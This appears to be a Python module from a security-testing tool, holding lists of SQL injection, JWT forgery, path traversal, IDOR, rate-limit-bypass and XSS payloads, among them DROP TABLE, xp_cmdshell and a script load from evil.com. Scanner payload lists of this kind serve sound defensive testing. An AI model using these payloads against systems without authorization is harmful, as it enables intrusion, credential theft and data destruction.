"""
©AngelaMos | 2025
Security testing payloads for various attack vectors
"""


class SQLiPayloads:
    """
    SQL Injection test payloads covering various database types and techniques
    """

    ERROR_SIGNATURES = {
        "mysql": [
            "sql syntax",
            "mysql_fetch",
            "mysql_num_rows",
            "warning: mysql",
            "mysqli",
            "mysql error",
            "mysql_",
        ],
        "postgres": [
            "postgresql",
            "pg_query",
            "pg_exec",
            "error: syntax error",
            "pg_",
            "pgsql",
            "postgres error",
        ],
        "mssql": [
            "odbc sql server",
            "sqlserver jdbc driver",
            "msg ",
            "sqlexception",
            "microsoft sql",
            "sql server",
        ],
        "oracle": [
            "ora-",
            "oracle.jdbc",
            "oracle error",
            "oracle database",
            "pl/sql",
        ],
    }

    BASIC_AUTHENTICATION_BYPASS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        ") or '1'='1--",
        ") or ('1'='1--",
    ]

    UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT NULL,version()--",
        "' UNION SELECT NULL,database()--",
    ]

    TIME_BASED_BLIND = [
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1'; SELECT SLEEP(5)--",
        "'; BENCHMARK(5000000,MD5('test'))--",
        "1' AND SLEEP(5)--",
        "1' OR SLEEP(5)--",
        "'; pg_sleep(5)--",
        "1'; pg_sleep(5)--",
    ]

    BOOLEAN_BASED_BLIND = [
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND SUBSTRING(version(),1,1)='5'--",
        "1' AND ASCII(SUBSTRING(database(),1,1))>97--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT LENGTH(database()))>0--",
    ]

    ERROR_BASED = [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT @@version) AS int)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "' AND exp(~(SELECT * FROM (SELECT 1)x))--",
        "' OR 1 GROUP BY CONCAT_WS(0x3a,version(),floor(rand()*2)) HAVING MIN(0)--",
    ]

    STACKED_QUERIES = [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked'--",
        "'; EXEC xp_cmdshell('whoami')--",
        "'; CREATE TABLE test(id INT)--",
    ]

    COMMENT_VARIATIONS = [
        "admin'--",
        "admin'#",
        "admin'/*",
        "admin'-- -",
        "admin';--",
        "admin';#",
    ]

    @classmethod
    def get_all_payloads(cls) -> list[str]:
        """
        Get all SQLi payloads combined

        Returns:
            list[str]: All SQLi test payloads
        """
        return (
            cls.BASIC_AUTHENTICATION_BYPASS + cls.UNION_BASED +
            cls.TIME_BASED_BLIND + cls.BOOLEAN_BASED_BLIND +
            cls.ERROR_BASED + cls.STACKED_QUERIES +
            cls.COMMENT_VARIATIONS
        )

    @classmethod
    def get_error_signatures(cls) -> dict[str, list[str]]:
        """
        Get error signatures for detecting database types

        Returns:
            dict[str, list[str]]: Database error signature mappings
        """
        return cls.ERROR_SIGNATURES


class AuthPayloads:
    """
    Authentication and authorization test payloads
    """

    JWT_NONE_ALGORITHM_VARIANTS = [
        "none",
        "None",
        "NONE",
        "nOnE",
        "NoNe",
        "NOne",
    ]

    COMMON_AUTH_HEADERS = [
        "Authorization",
        "X-API-Key",
        "X-Auth-Token",
        "X-Access-Token",
        "Bearer",
        "Token",
        "API-Key",
        "ApiKey",
        "Access-Token",
        "Session",
        "X-Session-Token",
        "X-CSRF-Token",
        "Authentication",
    ]

    INVALID_TOKEN_FORMATS = [
        "",  # Empty token
        "invalid",
        "null",
        "undefined",
        "Bearer",  # Just the prefix
        "Bearer ",  # Prefix with space
        "1234567890",
        "admin",
        "../../../etc/passwd",
        "' OR '1'='1",
    ]

    JWT_ATTACKS = [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",  # None algorithm
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",  # No signature
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30",  # Empty payload
    ]

    @classmethod
    def get_all_headers(cls) -> list[str]:
        """
        Get all auth header names

        Returns:
            list[str]: All authentication header variations
        """
        return cls.COMMON_AUTH_HEADERS

    @classmethod
    def get_jwt_none_variants(cls) -> list[str]:
        """
        Get JWT none algorithm case variations

        Returns:
            list[str]: None algorithm variations for testing
        """
        return cls.JWT_NONE_ALGORITHM_VARIANTS


class IDORPayloads:
    """
    Insecure Direct Object Reference (IDOR) test patterns
    """

    NUMERIC_ID_MANIPULATIONS = [
        0,
        -1,
        1,
        2,
        9999,
        99999,
        999999,
    ]

    STRING_ID_MANIPULATIONS = [
        "admin",
        "root",
        "test",
        "user",
        "1",
        "0",
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
    ]

    UUID_MANIPULATIONS = [
        "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111",
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
    ]

    @classmethod
    def get_numeric_tests(cls) -> list[int]:
        """
        Get numeric ID test values

        Returns:
            list[int]: Numeric ID manipulation values
        """
        return cls.NUMERIC_ID_MANIPULATIONS

    @classmethod
    def get_string_tests(cls) -> list[str]:
        """
        Get string ID test values

        Returns:
            list[str]: String ID manipulation values
        """
        return cls.STRING_ID_MANIPULATIONS


class RateLimitBypassPayloads:
    """
    Rate limiting bypass techniques and patterns
    """

    HEADER_PATTERNS = {
        "limit":
        r"x-ratelimit-limit|x-rate-limit-limit|ratelimit-limit",
        "remaining":
        r"x-ratelimit-remaining|x-rate-limit-remaining|ratelimit-remaining",
        "reset":
        r"x-ratelimit-reset|x-rate-limit-reset|ratelimit-reset",
        "retry_after": r"retry-after",
    }

    ENDPOINT_VARIATIONS = [
        "/",
        "//",
        "/./",
        "/.",
        "/?",
        "/?dummy=1",
        "/?test=1",
        "/;",
        "/%2e",
        "/%00",
    ]

    HEADER_SPOOFING = [
        {
            "X-Forwarded-For": "127.0.0.1"
        },
        {
            "X-Forwarded-For": "8.8.8.8"
        },
        {
            "X-Real-IP": "127.0.0.1"
        },
        {
            "X-Originating-IP": "127.0.0.1"
        },
        {
            "X-Remote-IP": "127.0.0.1"
        },
        {
            "X-Client-IP": "127.0.0.1"
        },
        {
            "CF-Connecting-IP": "127.0.0.1"
        },
        {
            "True-Client-IP": "127.0.0.1"
        },
    ]

    USER_AGENT_ROTATION = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "curl/7.64.1",
        "python-requests/2.31.0",
    ]

    @classmethod
    def get_bypass_headers(cls) -> list[dict[str, str]]:
        """
        Get rate limit bypass header combinations

        Returns:
            list[dict[str, str]]: Header combinations for testing
        """
        return cls.HEADER_SPOOFING

    @classmethod
    def get_header_patterns(cls) -> dict[str, str]:
        """
        Get rate limit header detection patterns

        Returns:
            dict[str, str]: Regex patterns for rate limit headers
        """
        return cls.HEADER_PATTERNS

    @classmethod
    def get_endpoint_variations(cls) -> list[str]:
        """
        Get endpoint variations for bypass testing

        Returns:
            list[str]: Endpoint path variations
        """
        return cls.ENDPOINT_VARIATIONS


class XSSPayloads:
    """
    Cross-Site Scripting (XSS) test payloads for potential future testing
    """

    BASIC_XSS = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>confirm('XSS')</script>",
        "<script>prompt('XSS')</script>",
        "<script src='http://evil.com/xss.js'></script>",
    ]

    EVENT_HANDLER_XSS = [
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ]

    SVG_XSS = [
        "<svg/onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><animate onbegin=alert('XSS')>",
        "<svg><set attributeName=onmouseover to=alert('XSS')>",
    ]

    IFRAME_XSS = [
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<iframe src=data:text/html,<script>alert('XSS')</script>></iframe>",
        "<iframe srcdoc='<script>alert(\"XSS\")</script>'></iframe>",
    ]

    ENCODED_XSS = [
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    ]

    ATTRIBUTE_BREAKING = [
        "' onmouseover='alert(\"XSS\")'",
        '" onmouseover="alert(\'XSS\')"',
        "' onclick='alert(\"XSS\")' '",
        '" autofocus onfocus="alert(\'XSS\')"',
        "'/><script>alert('XSS')</script>",
        "\"/><script>alert('XSS')</script>",
    ]

    FILTER_BYPASS = [
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<script>alert('XSS')//",
        "<script>alert('XSS')<!--",
        "<<script>alert('XSS')</script>",
        "<script\x20type='text/javascript'>alert('XSS')</script>",
        "<script\x0d\x0a>alert('XSS')</script>",
    ]

    POLYGLOT_XSS = [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "-->'><script>alert(1)</script>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></script>",
    ]

    @classmethod
    def get_all_payloads(cls) -> list[str]:
        """
        Get all XSS test payloads combined

        Returns:
            list[str]: All XSS test payloads
        """
        return (
            cls.BASIC_XSS + cls.EVENT_HANDLER_XSS + cls.SVG_XSS +
            cls.IFRAME_XSS + cls.ENCODED_XSS +
            cls.ATTRIBUTE_BREAKING + cls.FILTER_BYPASS +
            cls.POLYGLOT_XSS
        )

    @classmethod
    def get_basic_payloads(cls) -> list[str]:
        """
        Get basic XSS test payloads

        Returns:
            list[str]: Basic XSS payloads
        """
        return cls.BASIC_XSS
